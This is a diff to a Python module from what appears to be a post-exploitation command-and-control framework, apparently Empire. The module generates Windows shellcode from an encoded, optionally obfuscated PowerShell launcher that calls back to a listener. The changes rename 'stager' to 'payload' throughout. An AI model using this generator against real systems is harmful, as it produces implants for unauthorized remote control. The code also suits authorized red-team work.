@@ -1,6 +1,6 @@
 from lib.common import helpers 
 
-class Stager:
+class payload:
     
     def __init__(self, mainMenu, params=[]):
 
@@ -9,7 +9,7 @@ class Stager:
 
             'Author': ['@xorrior', '@monogas'],
 
-            'Description': ('Generate a windows shellcode stager'),
+            'Description': ('Generate a windows shellcode payload'),
 
             'Commemts': [
                 ''
@@ -18,12 +18,12 @@ class Stager:
 
         self.options = {
             'Listener' : {
-                'Description'   :   'Listener to generate stager for.',
+                'Description'   :   'Listener to generate payload for.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
             'Language' : {
-                'Description'   :   'Language of the stager to generate.',
+                'Description'   :   'Language of the payload to generate.',
                 'Required'      :   True,
                 'Value'         :   'powershell'
             },
@@ -32,8 +32,8 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   'x64'
             },
-            'StagerRetries' : {
-                'Description'   :   'Times for the stager to retry connecting.',
+            'payloadRetries' : {
+                'Description'   :   'Times for the payload to retry connecting.',
                 'Required'      :   False,
                 'Value'         :   '0'
             },
@@ -89,7 +89,7 @@ class Stager:
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
-        stagerRetries = self.options['StagerRetries']['Value']
+        payloadRetries = self.options['payloadRetries']['Value']
         obfuscate = self.options['Obfuscate']['Value']
         obfuscateCommand = self.options['ObfuscateCommand']['Value']
 
@@ -105,11 +105,11 @@ class Stager:
                 obfuscateScript = False
             
             if obfuscate.lower() == "true" and "launcher" in obfuscateCommand.lower():
-                print helpers.color("[!] if using obfuscation, LAUNCHER obfuscation cannot be used in the dll stager.")
+                print helpers.color("[!] if using obfuscation, LAUNCHER obfuscation cannot be used in the dll payload.")
                 return ""
             
             # generate the PowerShell one-liner with all of the proper options are set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+            launcher = self.mainMenu.payloads.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, payloadRetries=payloadRetries)
 
             if launcher == "":
                 print helpers.color("[!] Error in launcher generation.")
@@ -117,6 +117,6 @@ class Stager:
             else:
                 launcherCode = launcher.split(" ")[-1]
 
-                shellcode = self.mainMenu.stagers.generate_shellcode(launcherCode, arch)
+                shellcode = self.mainMenu.payloads.generate_shellcode(launcherCode, arch)
 
                 return shellcode
